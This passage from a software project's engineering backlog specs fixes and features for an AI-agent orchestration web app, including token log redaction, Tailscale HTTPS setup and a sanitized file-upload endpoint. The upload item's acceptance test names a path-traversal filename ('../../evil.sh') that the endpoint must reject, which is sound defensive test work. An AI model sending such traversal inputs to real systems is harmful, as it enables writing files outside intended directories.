  test steps.
- **Quota usage in SetupView's model-health panel** — F16's explicitly
  skipped nice-to-have ("N runs / $X used this window").
- **v0.2.0 tagged** with this Part's docs PR; keep tagging at wave
  boundaries.

---

## Part 5 — Post-UX-wave fixes & remote-QoL wave (Fable, 2026-07-07)

Produced by auditing the merged U1–U10 code (PRs #59–#62) on `main`, plus a
review of the whole app against the deployment the owner actually plans:
the server on an EC2 instance inside a Tailscale tailnet, planned and
supervised from any device (often a phone), running near-autonomously.
Every "Problem" below was confirmed against the actual code on `main`, not
inferred from the progress notes. Verdict on the U1–U10 wave itself: all
ten items are genuinely implemented as specced and the verification claims
held up — this Part is polish and gaps *around* that work, not rework.

**Workflow (same as Parts 1–4):**
- Branch → PR → merge; CI (F14) green on every PR; item IDs in commit
  messages; update the Phase 10 table in Progress as you land.
- Verification bar unchanged: typecheck/build/engine+adapter tests green,
  live verification (the `agent-browser` pattern) for anything with a UI
  surface, evidence in PR descriptions — Fable re-verifies after merge.
  Part 3's browser note still applies (pick the local macOS browser).
- The verify-before-writing rule from F15/F17 applies doubly to F20: never
  document a command you haven't run — where this environment can't run
  one (no tailscale, no EC2), say so explicitly in the doc text.

### Fixes (do these first, top-down)

### B20. Projects-page "Pause" is an unconfirmed hard abort — HIGH (footgun)

**Where:** `apps/web/src/pages/ProjectsView.tsx` (~line 161 — the
running-project branch calls `act(p.id, "pauseProject", { drain: false })`).

**Problem:** the row's single run-control is labeled "⏸ Pause" but passes
`drain: false` — the immediate-abort mode. Its own tooltip admits it
("Abort any running task immediately and requeue it to backlog").
`ProjectHeader.tsx` gets this right: "Pause (finish current)" is
`drain: true`, and the destructive "Stop now" is a separate button behind a
`window.confirm`. On the Projects page, one click on something labeled
*Pause* kills a running agent mid-task with no confirmation — exactly the
class of misclick U6 moved the model dropdown to avoid. (The row buttons
landed with F12 and predate the UX wave; nobody re-checked them against
F3's pause-mode split.)

**Fix:** mirror ProjectHeader on the row: "Pause" → `{ drain: true }` with
the finish-current tooltip; add a separate "Stop now" button using the same
confirm copy `ProjectHeader.stopNow()` uses. Keep both visually compact
(the row is already dense).

**Acceptance:** with a task running, clicking the row's Pause leaves the
active agent running (drains after it finishes — no abort); Stop now asks
for confirmation and aborts on confirm; tooltips match actual behavior.
Live-verify the non-destructive path against a scratch project (no real
model cost needed — the mock server's seed is fine for the button wiring;
the drain semantics themselves were verified back in F3).

### S7. API token written to server logs via the WS query param — MEDIUM

**Where:** `packages/server/src/index.ts` (~line 506,
`Fastify({ logger: true })`); `apps/web/src/hooks/useWS.ts` appends
`?token=<API_TOKEN>` to the upgrade URL (by design — browsers can't set
headers on a WS upgrade; S2/S6).

**Problem:** Fastify's default request logging includes the full request
URL, so every WebSocket connect writes `GET /ws?token=<the real token>` to
stdout — which systemd persists in the journal on the target EC2
deployment. S6's own verification evidence quotes exactly such log lines.
Anyone who can read the logs (or a log snippet pasted into a bug report)
gets the token.

**Fix:** override the logger's `req` serializer to redact the `token`
query parameter from the logged URL (e.g.
`url.replace(/([?&]token=)[^&]*/, "$1[redacted]")`) while keeping
method/path/status logging intact. Check the actual serializer shape
against the installed Fastify version's docs/output — don't assume it from
memory. Also grep the server for any other place a request URL is logged
(the auth hook, `ws-hub.ts`) and redact there too.

**Acceptance:** boot with `API_TOKEN` set, connect the web app → the
server log shows `/ws?token=[redacted]`, and `grep`ing the captured log
output for the real token finds nothing; normal request logging still
shows method/path/status; a wrong-token 401's log line is redacted too.

### B21. Board drag-and-drop failures are silent — LOW

**Where:** `apps/web/src/pages/Board.tsx` `handleDrop` (~line 360 — the
catch reverts the optimistic move and shows nothing).

**Problem:** B5's server rules reject most manual status moves with
genuinely useful messages ("PATCH can only requeue a task to \"backlog\"
or \"ready\"", a 409 telling you to Stop an active task first). The catch
swallows them, so the card just snaps back — indistinguishable from the
drag not registering. U3's own live-testing hit exactly this confusion
(two fixture picks "failed silently" before those rules were understood).

**Fix:** `toast(String(e), "error")` in the catch — `useToast` is already
in scope in Board.tsx.

**Acceptance:** dragging an in-progress card to Done shows a toast with
the server's message and the card reverts; a valid backlog→ready drag
stays silent.

### B22. Schedule form can silently delete a saved schedule — MEDIUM (data loss)

**Where:** `apps/web/src/components/ProjectConfigFields.tsx`
`projectConfigFromForm` (~lines 111–124).

**Problem:** the schedule is only emitted when its fields are complete
(daily needs hour AND minute; interval needs hours). A partially-filled
form — hour set, minute blank; or the mode switched to interval with hours
blank — omits `schedule` from the produced config entirely, so saving
**deletes the previously stored schedule** with no warning. This is the
same bug class U7 fixed for the enabled-checkbox, one level down.

**Fix:** distinguish three cases: all schedule fields blank → no schedule
(intentional removal — current behavior, keep); complete → emit (keep);
**partial → invalid**. For the partial case, export a
`projectConfigFormError(form): string | null` helper from
ProjectConfigFields and have both save sites (ProjectHeader's `saveConfig`
and NewProject's create) disable save and show the message ("Schedule
needs both HH and MM" / "Interval schedule needs hours"). Show the same
hint inline next to the schedule inputs so the fix is discoverable before
the save attempt.

**Acceptance:** with a saved daily schedule, blanking the minute → save is
blocked with a visible message and the stored schedule survives (verify
via `GET /api/projects/:id`); blanking hour AND minute then saving removes
the schedule (intentional path still works); NewProject shows the same
validation.

### B23. `notifications` table grows unbounded — LOW

**Where:** `packages/server/src/db/repo.ts` `getNotifications` (~line 782
— no LIMIT); nothing prunes notifications (B14 covered only `logs`; B10
only marks stale approvals expired, never deletes);
`apps/web/src/pages/Notifications.tsx` and App.tsx's U1 badge seed both
fetch the full list.

**Problem:** months of autonomous runs accumulate thousands of rows, all
fetched and rendered on every Notifications visit and every badge seed.

**Fix:** mirror B14's pattern: prune on boot + daily in `main()` — delete
notifications older than `NOTIFICATION_RETENTION_DAYS` (env, default 30)
**except** rows with `requiresApproval` and no `respondedWith` (a pending
approval must never be silently deleted, no matter how old). Add a LIMIT
(default ~200, newest first — the query already orders by `created_at
DESC`) to `getNotifications`. Add the env var to `.env.example`.

**Acceptance:** seed 300 old responded notifications + 1 old pending
approval → boot → the old responded rows are pruned, the pending approval
survives; the page and the U1 badge still work.

### B24. Browser-notification dead ends are silent — LOW

**Where:** `apps/web/src/hooks/useBrowserNotify.tsx` (~line 8 `SUPPORTED`;
~line 46 the constructor try/catch); `Settings.tsx`'s "Browser
Notifications" section; `docs/USER_GUIDE.md`.

**Problem:** two dead ends the UI currently hides. (1) Over plain HTTP
from another machine (`http://<tailnet-ip>:3987`) there is no secure
context, so the Notification API is unavailable — Settings just says "Not
supported in this browser" with no hint that the fix is HTTPS (see F20).
(2) On Android Chrome, `new Notification(...)` **throws even with
permission granted** (that platform only allows
`ServiceWorkerRegistration.showNotification`) — the catch swallows it, so
the user "enables" notifications that can never fire and Settings shows a
green "Enabled."

**Fix:** honest messaging, not a service worker (that's future work F26
notes as its hook). (1) When `!window.isSecureContext`, show specific
copy: "Needs HTTPS — see the user guide's Remote setup (`tailscale
serve`)." (2) On grant, fire a test notification inside the same try/catch
and surface a failure state ("This browser can't show page notifications —
rely on Telegram for pings on this device."). (3) Update the guide's
notification mentions: browser notifications are for desktop browsers over
HTTPS/localhost; on phones, Telegram is the channel.

**Acceptance:** over an insecure non-localhost origin, Settings explains
the HTTPS requirement instead of the generic "not supported"; on a
platform where construction throws, enabling surfaces the failure message
instead of "Enabled."; guide updated.

### QoL wave (after the fixes, top-down)

### F20. Remote setup docs: `tailscale serve` HTTPS + EC2 headless auth — docs only, do first

**Where:** `docs/USER_GUIDE.md` "Remote setup (Tailscale)" (~line 173);
`deploy/README.md`; B24's Settings copy links here.

**Problem:** the current remote section says `HOST=0.0.0.0` + `API_TOKEN`.
That works, but it's strictly worse than the tailscale-native path, and it
leaves everything on plain HTTP — which quietly breaks secure-context
browser features (B24) and sends the bearer token unencrypted (fine inside
WireGuard, but only inside it). And there is no EC2/headless-Linux
guidance at all, even though that's the owner's actual target — the CLIs'
login flows are exactly where a first headless deploy stalls.

**Fix (rewrite the Remote setup section + add an EC2 section):**
1. **Recommended path:** keep `HOST=127.0.0.1` and put `tailscale serve`
   in front — it serves `https://<machine>.<tailnet>.ts.net` with a
   trusted cert, proxying to localhost, so no non-loopback bind is needed
   at all (the API_TOKEN startup refusal never triggers; still recommend
   setting a token as defense in depth). **Verify the exact invocation
   with a real `tailscale` CLI** (`tailscale serve --help`) before writing
   it down; if no tailscale is installed in this environment, write the
   command from current official docs and mark it "verify on your box"
   explicitly. Warn: `tailscale funnel` exposes the port to the public
   internet — never use it for this.
2. Keep the existing `HOST=0.0.0.0` + token instructions as the
   documented fallback.
3. New **"EC2 / headless Linux"** subsection: prereqs (node 22, git, gh,
   claude, opencode), then headless auth for each CLI — `gh auth login`'s
   device flow; `opencode auth login`; Claude Code on Linux (note the F10
   Keychain caveat is macOS/container-specific — on Linux the credentials
   live on disk, so subscription auth is expected to work; document the
   login flow and the `ANTHROPIC_API_KEY` fallback, and clearly mark
   anything not directly verified). Point at `deploy/`'s systemd unit, the
   DB/backup locations (F17), and cross-link F24's update procedure once
   it exists.

**Acceptance:** the guide's remote section leads with `tailscale serve` +
loopback; an EC2 section exists covering all the CLI auth flows with
verified-vs-unverified clearly marked; B24's Settings copy links to the
section.

### F21. Hash routing + deep links

**Where:** `apps/web/src/App.tsx` (`page` + `selectedProjectId` are plain
`useState`; `STORAGE_KEY` persists only the project).

**Problem:** a refresh anywhere lands back on Board; nothing is linkable —
a phone user can't bookmark Notifications, and a Telegram approval can't
link into the app (F22 wants exactly that). For a multi-device deployment
this is the single biggest friction item.

**Fix:** sync page + project to the URL hash — no router dependency:
- Format: `#/<page>` for global pages (`#/settings`), `#/p/<projectId>/
  <page>` for project pages (`#/p/abc123/board`).
- On load: parse the hash; a valid project id in it wins over
  localStorage; invalid/empty falls back to current behavior (stored
  project, Board, F1's welcome redirect unchanged).
- On navigation: write the hash (pushState, so back/forward work) — all
  through the existing `navigate()` so the U4 dirty-guard keeps working.
  Listen to `hashchange` for back/forward and route it through the same
  guard; if the user cancels the confirm, restore the previous hash.
- Keep it page-level only: the selected task / drawer state does NOT go
  into the URL (avoids hash churn on every card click).

**Acceptance:** refresh on Costs stays on Costs for the same project;
pasting `#/notifications` into a fresh tab opens Notifications; browser
back returns to the previous page; with dirty Settings, both a tab click
and browser-back still confirm, and cancel keeps the edits; the first-run
onboarding redirect still works.

### F22. Approval context (PR link + validator reasons) in the web UI

**Where:** `packages/types/src/domain.ts` `Notification` (no context field
today); the F5 `ApprovalContext` plumbing (engine-runner → `telegram.ts`)
that already computes PR url + top validator reasons;
`packages/server/src/db` (notifications schema — the standard `ALTER
TABLE` migration list); `apps/web/src/pages/Notifications.tsx`; mock
server seed; CONTRACT.md.

**Problem:** F5 enriched only the *Telegram* message. The web card is
title + message, so approving from the app (phone or desktop) means
deciding blind or hunting the Board for the task's drawer. For "step in
from any device," the approval screen should carry what the decision
needs.

**Fix:** add optional `context?: { prUrl?: string; reasons?: string[] }`
to `Notification` (types + CONTRACT.md + a mock-seed example); persist it
(new nullable JSON column via the migration list); populate it at the same
site telegram's `ApprovalContext` is built — one source, both channels;
render it on the Notifications card when present: a "View PR ↗" link and
the reasons as a short list above the approve/reject buttons. Rows without
context render exactly as today.

**Acceptance:** a new risky-merge approval shows the PR link + reasons on
the web card (live-verify via a seeded approval with context — same
technique as U1's batch); rows predating the migration render unchanged;
Telegram output unchanged; CONTRACT.md updated.

### F23. Global "Stop all" control

**Where:** `apps/web/src/App.tsx` (nav top row);
`packages/server/src/index.ts` + `ROUTES` in `@orc/types` + CONTRACT.md +
mock server.

**Problem:** the safety rails are all per-project. The owner's scenario is
several projects running unattended; when something looks wrong from a
phone, "make everything stop NOW" currently takes Projects page → per-row
action → repeat. A panic control should be one confirmed tap from
anywhere.

**Fix:** new route `POST /api/engine/stop-all` — for every running
project, call the existing `engine.pause(project, { drain: false })` (the
same abort path the per-project Stop now uses); write one audit entry
(kind `"stopped"`, actor human, listing affected projects); return the
list. Verify manually-dispatched tasks are covered by that path (the
B1/B3 `manualRuns` machinery) — if not, also call `stopTask` for those.
UI: a red "Stop all" button in the nav top row, rendered only when ≥1
project is running (App already has live project statuses via WS), behind
a `window.confirm` naming the affected projects.

**Acceptance:** two projects running → one click + confirm → both paused,
active agent processes gone within ~3s (the existing SIGTERM→SIGKILL
path), audit entry written; the button is absent when nothing is running;
the mock server implements the route so the UI is verifiable without real
runs.

### F24. Update story: `scripts/update.sh` + version surfacing

**Where:** new `scripts/update.sh`; `packages/server` (health route);
`apps/web/src/pages/SetupView.tsx`; `docs/USER_GUIDE.md` (new "Updating"
section; cross-link from F20's EC2 section).

**Problem:** nothing documents how to update a deployed instance, and the
server doesn't report what version it's running — on a remote box that's
"ssh in and guess."

**Fix:** (1) `scripts/update.sh`: refuse on a dirty tree; warn (prompt) if
any project is currently running (`GET /api/projects` against localhost,
tolerating the server being down); then `git pull --ff-only && npm ci &&
npm run build`; restart via systemd if the `hoopedorc` unit exists, else
print the restart instruction. (2) Add `version` (from the root
`package.json`) to `GET /api/health`; show it on SetupView ("Hoopedorc
vX.Y.Z"). (3) Short "Updating" section in the guide.

**Acceptance:** the script runs end-to-end on a clean checkout locally
(minus the systemd step — environment-dependent, mark it); a dirty tree →
refusal; `/api/health` returns the version and SetupView displays it.

### F25. Single shared WebSocket connection

**Where:** `apps/web/src/hooks/useWS.ts` and its call sites (`App.tsx`,
`Board.tsx`, `MissionControl.tsx`, `Notifications.tsx`).

**Problem:** every `useWS` call opens its own socket, so the Board view
holds **three** concurrent connections (App + Board + MissionControl) to
the same server for the same project — three reconnect storms after every
server restart or phone sleep, three snapshot replays, for zero benefit.

**Fix:** a module-level connection manager — one socket, reference-counted
handler registry, the same backoff logic; `useWS` keeps its exact
signature so call sites don't change. All current subscribers use the same
projectId; on projectId change, resubscribe once. Note `ws-hub.ts` tracks
one subscription per socket — verify that stays satisfied (it does, since
all subscribers share the projectId; log a warning if a second distinct
projectId ever registers, so a future regression is visible).

**Acceptance:** the Board view opens exactly one WS connection (server log
/ devtools network tab); the U1 badge, MissionControl approvals, and Board
live logs all still update; kill and restart the server → a single
reconnection, everything resumes.

### F26. PWA manifest

**Where:** `apps/web/index.html`, `apps/web/public/`.

**Problem:** on a phone the app lives in a browser tab; add-to-home-screen
produces a generic bookmark. An installable manifest gives it an icon and
a standalone window, and is the prerequisite for any future service-worker
notification work (the honest gap B24 documents).

**Fix:** `manifest.webmanifest` (name/short_name "Hoopedorc", `display:
standalone`, background/theme `#0a0a0a`, 192/512 icons — a simple
generated monogram is fine), `<link rel="manifest">` + theme-color meta.
**No service worker in this item.**

**Acceptance:** Chrome devtools' manifest panel shows no errors;
add-to-home-screen installs with the icon and opens standalone; the built
`dist` (F10's static-serving path) serves the manifest and icons.

### UX polish (small, batch together)

### U11. No `beforeunload` guard while Settings is dirty — LOW

**Where:** `apps/web/src/pages/Settings.tsx` (U4 guarded in-app nav only).

**Problem:** U4's confirm covers tab clicks, but reload/close — an easy
reflex on a phone — still discards edits silently.

**Fix:** while dirty, register a `beforeunload` handler that calls
`preventDefault()` (the standard browser "unsaved changes" prompt); remove
it when clean or on unmount.

**Acceptance:** dirty → reload → the native confirm appears; after save,
reload is silent.

### U12. `agoLabel` has no hours unit — TRIVIAL

**Where:** `apps/web/src/components/TaskCard.tsx` `agoLabel` (~line 8).

**Problem:** a 2-hour run reads "127m 33s ago" on card heartbeats and the
MissionControl strip.

**Fix:** ≥ 60m → `${h}h ${m}m ago`. Verify MissionControl's " ago"-suffix
strip still produces "elapsed 2h 5m".

**Acceptance:** 2h 5m renders "2h 5m ago" (card) and "elapsed 2h 5m"
(strip).

### U13. MissionControl "elapsed" resets on status transitions — LOW

**Where:** `apps/web/src/components/MissionControl.tsx` (~line 90 computes
elapsed from `task.updatedAt`).

**Problem:** `updatedAt` bumps on every task update — including the
mid-attempt `in_progress → in_review` transition (B6) — so "elapsed"
visibly resets to zero while the same attempt is still going.

**Fix:** Board already sees every `task.updated`: record the timestamp a
task *enters* the active set (status changes into `in_progress` from a
non-active status) in a small map and pass it to MissionControl; fall back
to `updatedAt` when unknown (initial page load). Don't fetch runs for
this.

**Acceptance:** a task moving `in_progress → in_review` keeps its elapsed
counter; after a reload the label is still roughly right (fallback).

### U14. Notifications page: pending approvals should sort first — LOW

**Where:** `apps/web/src/pages/Notifications.tsx` (renders in fetch order,
`createdAt` DESC).

**Problem:** the one thing that blocks a run — a pending approval — can
sit below newer info/warn noise.

**Fix:** sort pending approvals (`requiresApproval && !respondedWith`) to
the top, newest first within each group; optionally a "Needs response"
subheading when any exist.

**Acceptance:** an older pending approval renders above newer info items;
once responded, it drops back into chronological order.

### What Part 5 deliberately does NOT include (for calibration)

- **No service worker / push notifications** — B24 fixes the messaging,
  F26 lays the manifest groundwork; actual SW notifications are future
  work (Telegram already covers the phone-ping channel well).
- **No sandbox work** — F13 phase 1 (gates-only, per
  `docs/specs/sandbox.md`) remains the biggest security-posture item on
  the post-Part-5 backlog, along with the rest of Part 4's "Beyond the UX
  wave" list (an `@orc/server` test package, quota usage in the health
  panel, release tagging).

---

## Part 6 — Owner-requested QoL wave + Phase 10 audit fixes (Fable, 2026-07-07)

Two halves, same as Parts 3–5. First, the **audit record** for the merged
Phase 10 work (PRs #64–#76): every item was re-verified against the actual
code on `main`, all sixteen are genuinely implemented as specced, and the
verification claims held up — the three fixes below are small gaps *around*
that work, not rework. Second, the **owner's QoL wave**: eight requests from
the owner (2026-07-07), specced as F27–F34 after reading the real code paths
each one touches, plus the two leftovers from Part 4's "Beyond the UX wave"
list that are now cheap enough to just do (T1, F35).

**Decisions on the previously-deferred optional items** (so they stop
haunting every wave):
- `@orc/server` test package — **in scope now** (T1). Everything it needs to
  test is pure or near-pure and already has exactly-shaped standalone-script
  verifications from Phases 5–10 to port.
- Quota usage in SetupView's health panel — **in scope now** (F35). One repo
  function that already exists, one panel column.
- **F13 phase 1 (gates-only sandbox) — still deferred, deliberately.** It's
  the biggest remaining security-posture item, but it's also the biggest
  chunk of work in the backlog, it needs Docker present on the deployment
  box (an environment question the owner hasn't settled), and nothing in
  this wave depends on it. It should be the headline item of the *next*
  wave, not an add-on to this one.
- F8's optional "pipe the run summary through the updates-role model" toggle
  — **stays unbuilt**. F29/F30 give the docs-role model a real, structural
  documentation job instead; a cosmetic rewording of the mechanical digest
  adds model dependence for little value.
- Service worker / push notifications — **still deferred** (unchanged from
  Part 5's calibration note; Telegram covers the phone-ping channel).

**Workflow (same as Parts 1–5):**
- Branch → PR → merge; CI (F14) green on every PR; item IDs in commit
  messages; update the Phase 11 table in Progress as you land.
- Verification bar unchanged: typecheck/build/engine+adapter (+server, once
  T1 lands) tests green, live verification for anything with a runtime
  surface, evidence in PR descriptions — Fable re-verifies after merge.
  Part 3's browser note still applies (pick the local macOS browser).
- The verify-before-writing rule (F15/F17/F20) applies to every CLI/library
  behavior this Part leans on — called out per item below.
- Several items add prompt text that goes to real models. Keep every new
  prompt block **bounded** (cap lengths on save, slice defensively at the
  injection site) — an unbounded Settings textarea must never be able to
  blow up every author prompt in the system.

### Fixes (do these first, as one small batch)

### B25. USER_GUIDE's `tailscale serve` example uses the wrong port — LOW (docs)

**Where:** `docs/USER_GUIDE.md` ~line 223 (`tailscale serve --bg 3987`).

**Problem:** the app's default port is **4317** (`config.ts` `ENV.port`,
`.env.example`, `deploy/Dockerfile` all agree); the guide's example says
`3987`. The parenthetical below it does say "replace with whatever PORT
you've configured", but a copy-paste of the recommended remote-setup command
on a default install proxies a port nothing listens on — exactly the kind of
first-deploy stall F20 exists to prevent.

**Fix:** change the example (and its parenthetical) to `4317`. Grep the
whole `docs/` + `deploy/` tree for `3987` to catch any other stragglers.

**Acceptance:** `grep -rn 3987 docs deploy` returns nothing; the example
matches `.env.example`'s PORT.

### B26. Old pending approvals can fall off the notification fetch — LOW

**Where:** `packages/server/src/db/repo.ts` `getNotifications` (the B23
`LIMIT 200`); consumers: `apps/web/src/pages/Notifications.tsx`, App.tsx's
U1 badge seed.

**Problem:** B23 was precise that *pruning* never deletes a pending
approval, but the fetch limit has no such exemption: an approval that has
sat unanswered while 200+ newer notifications accumulated (a long unattended
multi-project run is exactly the scenario this app is for) silently drops
off both the Notifications page and the U1 badge seed. The WS path masks it
only until the next reload. B10 bounds the window (approvals expire on
restart), but within one server uptime the one thing that blocks a run can
become invisible.

**Fix:** in `getNotifications`, always include pending approvals regardless
of the limit — e.g. a `UNION` of (all rows with `requires_approval = 1 AND
responded_with IS NULL`) with (the newest `LIMIT ?` rows), de-duplicated,
newest-first. Keep the signature unchanged.

**Acceptance:** new `@orc/server` test (lands with T1 — sequence these
sensibly, or verify via a standalone script if B26 merges first): seed 1 old
pending approval + 250 newer responded notifications → `getNotifications`
returns the pending approval; the page and badge render it.

### B27. `update.sh`'s systemd-unit detection is version-fragile — LOW

**Where:** `scripts/update.sh` (the `systemctl list-unit-files
hoopedorc.service` check).

**Problem:** `systemctl list-unit-files <pattern>` only started exiting
non-zero on zero matches in newer systemd releases; on older ones it prints
"0 unit files listed." and exits 0 — so on such a box the script would run
`sudo systemctl restart hoopedorc` against a unit that doesn't exist
(harmless-ish, but it fails with a confusing error and possibly a sudo
password prompt) instead of printing the manual-restart instruction. F24's
verification never hit this because macOS has no systemd at all (the
`command -v systemctl` guard short-circuits).

**Fix:** make the detection output-based, not exit-code-based:
`systemctl list-unit-files 'hoopedorc.service' 2>/dev/null | grep -q
'^hoopedorc\.service'` (or `systemctl cat hoopedorc >/dev/null 2>&1`).
Verify the chosen form against a real systemd box if one is reachable;
otherwise mark it "verify on your box" in a comment, per the F20 precedent.

**Acceptance:** on a box without the unit, the script prints the
manual-restart instruction and never invokes sudo; shellcheck-clean
(or at minimum `bash -n`) like the rest of the script.

### T1. A real `@orc/server` test package — do before the feature items

**Where:** `packages/server` (only workspace with no test script);
`.github/workflows/ci.yml`; root `package.json`.

**Problem:** Part 4 flagged it, Part 5 deferred it, and this wave adds
several server-side behaviors (B26, F27's upload sanitization, F28's session
files) that deserve real regression tests instead of one-off standalone
scripts that get thrown away after each PR.

**Fix:** add a `test` script to `@orc/server` using `node --test` (the same
runner engine/adapters use — no new dependency). Port the already-designed
standalone verifications into permanent tests: `scheduler.ts isScheduleDue`
(the 13 cases from F19/A3), `budget.ts checkModelQuota` window math (F16),
`db/backup.ts runBackup` (F17's three scenarios), `repo.pruneNotifications`
+ `getNotifications` (B23's pending-approval exemption + B26),
`redactTokenFromUrl` (S7). Real in-memory SQLite via the actual `initDb`/
`repo.*` functions, not mocks. Wire `npm test -w @orc/server` into CI next
to the existing two test steps and into the standing verification bar.

**Acceptance:** `npm test -w @orc/server` green locally and in CI on its own
PR; the five areas above each have at least their historical acceptance
scenarios covered.

### QoL wave (the owner's eight requests, top-down)

### F27. Plan-mode attachments: images/PDFs/files as planning context

**Owner's ask:** "attach files like images, pdf and such in the chat as
attachments. These files would get uploaded to a specific folder in the
project folder as context."

**Where:** `packages/server/src/index.ts` (plan routes, ~line 1184);
`packages/server/src/planner.ts` (`buildChatPrompt`/`buildDeconstructPrompt`);
`apps/web/src/pages/PlanView.tsx`; `@orc/types` `ROUTES` + CONTRACT.md;
new dependency `@fastify/multipart` (v9 line — the Fastify v5-compatible
major; check the actual compatibility table before pinning).

**Design:** attachments live in the project's clone at
`<project.localPath>/context/attachments/<name>`. That directory is the
"specific folder in the project folder" — and because the planner already
runs `claude -p` with the clone as its cwd (`resolvePlannerCwd`), the
planning model can read the files with its own file tools; no
base64-into-prompt plumbing, no size explosion in the transcript.

**Fix:**
1. **Routes:** `POST /api/projects/:id/plan/attachments` (multipart, one
   file per request), `GET .../plan/attachments` (list: name, size, mtime),
   `DELETE .../plan/attachments/:name`. Register in `ROUTES`, CONTRACT.md.
2. **Storage safety (treat this with S-item care — it's a write-to-disk
   endpoint):** take `basename` only; sanitize to `[A-Za-z0-9._-]`
   (reject anything empty or dotfile-leading after sanitizing); resolve the
   final path and require it to stay inside `context/attachments/`
   (prefix check on the resolved path, the same containment reasoning S4
   used); extension allowlist (`png jpg jpeg gif webp pdf md txt csv json`);
   size cap ~25MB (multipart limits option); collision → suffix `-2`, `-3`….
   `DELETE` applies the same sanitize+containment before unlinking.
3. **Planner integration:** both `buildChatPrompt` and
   `buildDeconstructPrompt` gain an "## Attached context files" block listing
   the repo-relative paths that currently exist on disk (server passes the
   list in), with one instruction line: read them with your file tools
   before answering; images and PDFs included. **Verify against the real
   CLI first** (the F15/F17 rule): confirm a headless `claude -p` run in a
   cwd containing a PNG and a PDF can actually read both when the prompt
   names them — don't assume it from Claude Code's interactive behavior.
4. **UI:** an attach button (hidden `<input type="file">`) in PlanView's
   chat composer; uploaded files render as small chips (name + remove ×)
   above the input, seeded from the GET on mount so they survive reload.
   Upload errors surface via the existing toast.
5. **Mock mode:** the seed project's `localPath` is `"."` (the server's own
   cwd) — writing uploads there would dirty this very repo. In `ENV.mock`,
   root attachments at `<tmpdir>/hoopedorc-mock-attachments/<projectId>/`
   instead so the UI stays fully exercisable.

**Acceptance:** upload a PNG and a PDF from PlanView → files appear under
`context/attachments/` with sanitized names; a filename like
`../../evil.sh` or `x.sh` is rejected with a 400; a >25MB file is rejected;
the next chat turn's prompt (verify via a log line or a temporary debug
dump) lists both files; asking the planner "what's in the attached PDF?"
gets a genuinely content-aware answer (live-verify once with a real file);
chips survive a reload; delete removes the file and the chip.

### F28. Plan-chat history archived as markdown session files

**Owner's ask:** "our chat history in plan mode to be recorded in an .md
file in said context folder. If i plan again it should create another .md
file as a different session."

**Where:** `packages/server/src/index.ts` (`/plan/chat`, `/plan/deconstruct`,
`/plan/commit`); `packages/server/src/db` (planning session storage — add a
`session_file` field the same way other columns were added, via the standard
migration list); reuses F27's `context/` convention.

**Design:** one markdown file per planning session at
`<localPath>/context/plan-sessions/<YYYY-MM-DD-HHmm>.md`. A "session" is
exactly what the existing planning-session row already models: it starts
with the first chat turn after the row is empty and ends when `/plan/commit`
clears it (existing behavior, untouched) — so "plan again" naturally starts
a new file.

**Fix:**
1. On each successful `/plan/chat` turn: if the stored session has no
   `session_file`, mint one from the current server-local time and persist
   it; then (re)write the whole file from the stored transcript — a tiny
   header (project name, session start, planner model) followed by
   `## User` / `## Assistant` sections in order. Rewriting wholesale keeps
   it correct without append bookkeeping.
2. On `/plan/deconstruct`: append (same rewrite) a `## Deconstructed plan`
   section — the PRD markdown plus a task list (title, difficulty, role,
   dependsOn).
3. On `/plan/commit`: write one final `## Committed` line (timestamp, task
   count) *before* the session row is cleared. The file itself is the
   durable archive; the cleared row just means the next chat mints a new
   file.
4. A failed file write must never fail the chat/commit request — warn-log
   and continue (same posture as F17's backup failures).
5. Session files are deliberately **not** git-committed by the server
   (unlike the PRD, nothing downstream reads them; they're the owner's
   archive). Note in the user guide that `context/` can be gitignored or
   committed at the user's discretion.

**Acceptance:** run a two-turn plan chat → one session file exists
containing both turns and the reply; deconstruct → the section appends;
commit → the `## Committed` line is present and the *next* chat turn creates
a **new** file; a read-only `context/` directory (chmod it in the test)
doesn't break the chat endpoint.

### F31. Engineering guidelines (coding / UX / security) in author + validator prompts

**Owner's ask:** "guidelines … in terms of UX, Coding structure, Security
that we can add in as system prompts for the coding and validating agents.
Just running the app properly isn't gonna cut it as good work."

**Where:** `@orc/types` `Settings`; `packages/server/src/config.ts`
(`defaultSettings`); `packages/engine/src/orchestrator.ts`
(`buildAuthorPrompt`, ~line 1201); `packages/engine/src/validator.ts` (the
review prompt); `apps/web/src/pages/Settings.tsx`; CONTRACT.md.

**Design:** guidelines are operator-editable text with strong shipped
defaults, injected into *both* sides of the loop — authors are told the
standards up front, and the validator grades against the same text, so
"meets the standards" is a checkable claim rather than vibes.

**Fix:**
1. **Types/defaults:** `Settings.guidelines?: { coding?: string; ux?:
   string; security?: string }`. Ship real defaults in `defaultSettings()`
   (concise, imperative, ~15–20 lines each — not essays):
   - *coding:* follow the repo's existing conventions before inventing new
     ones; small focused modules; no dead/commented-out code; handle errors
     at the boundary that can act on them; no `any`-typed escape hatches in
     TS repos; keep functions testable (pure logic separated from I/O);
     write/update tests for behavior you add.
   - *ux:* every async action shows a loading state and surfaces its errors
     (no silent failures); empty states say what to do next; interactive
     elements are keyboard-reachable; layouts hold up at phone width;
     readable contrast; destructive actions confirm.
   - *security:* never hardcode secrets or tokens; validate and bound all
     external input (body, params, files); parameterized queries only; no
     `eval`/dynamic `require`; don't add dependencies for what stdlib does;
     don't log credentials.
2. **Validation:** `PUT /api/settings` caps each field (~4000 chars) —
   the bounded-prompt rule at the top of this Part.
3. **Author injection:** `buildAuthorPrompt` appends an
   `## Engineering standards` section: always `coding` + `security`; add
   `ux` when the task looks UI-flavored (`task.role === "frontend"` — keep
   the heuristic exactly that simple). Settings already reach the
   orchestrator via `SchedulerDeps.settings`.
4. **Validator injection:** the review prompt includes the same text and one
   instruction: flag clear violations of these standards as reasons (and
   `request_changes` when substantive), but do not nitpick style the
   standards don't mention.
5. **UI:** a "Guidelines" Settings section with three labeled textareas +
   the standard dirty/save handling (U4's machinery already covers it).
6. Per-project overrides are **out of scope** for this item (global only) —
   note it as a future hook rather than building unused plumbing.

**Acceptance:** engine unit test: `buildAuthorPrompt` output contains the
standards section (and `ux` only for frontend-role tasks) — export or
otherwise make it testable the way B12/B13 exported their pure helpers;
validator prompt contains the same text (unit test at the same altitude);
settings round-trip + cap enforced (400 past the cap); defaults visible in
Settings UI on a fresh DB.

### F29. Documentation guidelines for the docs-role model

**Owner's ask:** "Grok needs to produce better documentation of the
projects being created, create guidelines as a system prompt for grok to
create solid readme, changelog and any helper documentation files."

**Where:** `packages/engine/src/orchestrator.ts` (`buildAuthorPrompt`);
`packages/server/src/index.ts` (`buildDocsTaskDraft`, ~line 146); the
